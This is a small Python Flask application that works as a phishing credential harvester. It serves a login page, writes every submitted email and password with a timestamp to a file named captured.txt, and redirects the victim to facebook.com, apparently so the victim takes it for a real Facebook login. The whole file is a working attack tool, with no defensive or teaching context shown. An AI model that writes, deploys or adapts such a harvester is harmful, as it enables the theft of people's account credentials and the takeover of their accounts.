from flask import Flask, request, redirect, render_template
from datetime import datetime

app = Flask(__name__)

@app.route("/", methods=["GET"])
def index():
    return render_template("login.html")

@app.route("/login", methods=["POST"])
def login():
    email = request.form.get("email")
    password = request.form.get("password")
    with open("captured.txt", "a") as f:
        f.write(f"[{datetime.now()}] Email: {email}, Password: {password}\n")
    return redirect("https://facebook.com")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
